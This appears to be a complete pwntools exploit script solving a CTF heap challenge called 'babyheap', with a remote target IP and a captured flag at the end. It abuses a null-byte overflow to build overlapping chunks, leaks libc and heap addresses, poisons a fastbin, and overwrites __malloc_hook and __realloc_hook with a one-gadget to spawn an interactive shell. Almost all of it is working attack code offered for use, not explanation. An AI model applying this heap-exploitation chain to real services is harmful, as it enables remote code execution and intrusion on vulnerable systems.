from pwn import *
import shutil

DEBUG = 1
if DEBUG:
     glibc_version="2.28"
     pwn_name="babyheap"
     #context.log_level = 'debug'
     debug_name='/tmp/'+pwn_name
     shutil.copyfile(pwn_name,debug_name)
     sleep(0.2)
     os.chmod(debug_name,0o770)
     ld_path='/glibc/'+glibc_version+'/lib/ld-'+glibc_version+'.so'
     libc_path='/glibc/'+glibc_version+'/lib/libc-'+glibc_version+'.so'
     sleep(0.2)
     cmd='patchelf --set-interpreter '+ld_path+' '+debug_name 
     os.system(cmd)
     sleep(0.2)
     context.terminal = ['tmux', 'splitw', '-h']
     p = process( debug_name, env={"LD_PRELOAD":libc_path}) 
     e = ELF(debug_name)
     libc = ELF(libc_path)
    
else:
     p = remote('23.236.125.55', 10002)
     #libc = ELF('./libc64.so')
     #libc = ELF('libc_64.so.6')


wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open('/proc/%s/mem' % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink('/proc/%s/exe' % pid)
   with open('/proc/%s/maps' % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split('-')[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def debug(addr):
    global mypid
    mypid = proc.pidof(p)[0]
    #raw_input('debug:')
    
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        print "program_base",hex(moduleBase)
        debug_stri="set follow-fork-mode child\n"
        if 'int' in str(type(addr)):
            debug_stri+='b* '+hex(moduleBase+addr)+'\n'
        elif 'list' in str(type(addr)):
            for i in addr:
                debug_stri+='b* '+hex(moduleBase+i)+'\n'
        #print debug_stri
        gdb.attach(p, debug_stri)

def add(size):
    p.recvuntil("Command: ")
    p.sendline('1')
    p.recvuntil("Size: ")
    p.sendline(str(size))

def update(idx,size,content):
    p.recvuntil("Command: ")
    p.sendline('2')
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Content: ")
    p.send(content)

def delete(idx):
    p.recvuntil("Command: ")
    p.sendline('3')
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def view(idx):
    p.recvuntil("Command: ")
    p.sendline('4')
    p.recvuntil("Index: ")
    p.sendline(str(idx))

def pwn():
   #debug([0x1846])
   for i in range(0,5):
       add(0x18)
       delete(0)
   for i in range(0,7):
       add(0x28)
       update(0,0x28,'a'*0x28)
       delete(0)
   add(0x28) #0
   add(0x58) #1
   for i in range(0,9):
       add(0x28)
       update(i+2,0x28,'a'*0x28)
       #delete(1)
   add(0x28)
   add(0x28)
   for i in range(0,11):
       delete(i+2)
   add(0x58) #2
   update(2,0x57,'b'*0x57)
   add(0x58) #3
   update(3,0x57,'b'*0x57)
   add(0x58) #4
   update(4,0x57,'b'*0x57)
   
   for i in range(0,7):
       add(0x38)
       delete(5)
   #debug(0x173e)
   for i in range(0,7):
       add(0x48)
       update(5,0x48,'c'*0x48)
       delete(5)
   #debug(0x149a)
   for i in range(0,7):
       add(0x58)
       update(5,0x57,'d'*0x57)
       delete(5) 
   # debug(0x149a)
   add(0x18)  # last two chunk
   delete(5)
   add(0x18)
   delete(5)
   ## right now top chunk size is 0x20
   # start hack
   delete(0)
   delete(1)
   #debug(0x149a)
   add(0x38) #0 small bin and large bin
   add(0x48) #1 next to unsorted bin
   
   update(1,0x48,'1'*0x48) # null-byte-overflow wihch make unsorted chunk size from 0x210 to 0x200

   add(0x48) #5
   add(0x48) #6
   # debug(0x149a)
   add(0x48) #7
   add(0x58) #8
   
   add(0x38) #9
   add(0x28) #10
   add(0x28) #11
   #add(0x18) #12 
   
   #delete(1)
   #delete(0)
   delete(5)
   delete(6)

   delete(2)
   delete(3) # fake big chunk formed here 
   
   
   #debug(0x149a)
   #for i in range(0,11):
   # leak libc address
   add(0x38) #2
   add(0x58) #3
   #debug(0x1846)
   view(7) # leaked here
   p.recvuntil(']: ')
   leak_libc=u64(p.recv(8))
   libc_base=leak_libc-0x3b2ca0
   target_addr=libc_base+0x3b2c60
   malloc_hook=libc_base+libc.symbols['__malloc_hook']
   rce=libc_base+0x419d6 

   evil_call_realloc=libc_base+0x123FD9
   print "libc base",hex(libc_base)
   add(0x48) #5
   add(0x58) #6
   delete(5)
   update(7,0x8,p64(0x61)) #overwrite fastbin
   #add(0x38)
   add(0x48) #5 now fastbin(0x50) has been set to 0x60 
   delete(4) 

   delete(6)
   view(8)
   p.recvuntil(']: ') # leak heap address
   heap_base=u64(p.recv(8))-0x1f7b0
   print "heap base",hex(heap_base)
   unsorted_addr=heap_base+0x1f630
   print "unsorted addr",hex(unsorted_addr)
   update(8,8,p64(target_addr))
   add(0x58) #4
   debug(0x149a)
   add(0x58) #6
   fake_struct=p64(0)*6+p64(malloc_hook-0x28)+p64(0)+p64(leak_libc)*2+p64(leak_libc+0x10)[:7]
   update(6,0x57,fake_struct) # restore the original data for avoiding crash.
   add(0x20) #12 malloc out the malloc_hook and realloc_hook
   payload='\x00'*0x10+p64(rce)+p64(evil_call_realloc)
   update(12,0x20,payload) # write evil data
   p.recvuntil('Command:')
   p.sendline('1')
   p.recvuntil(": ")
   p.sendline('2') #trigger the malloc
   p.interactive() #get the shell

if __name__ == '__main__':
   pwn()

#gigem{34sy_CC428ECD75A0D392}

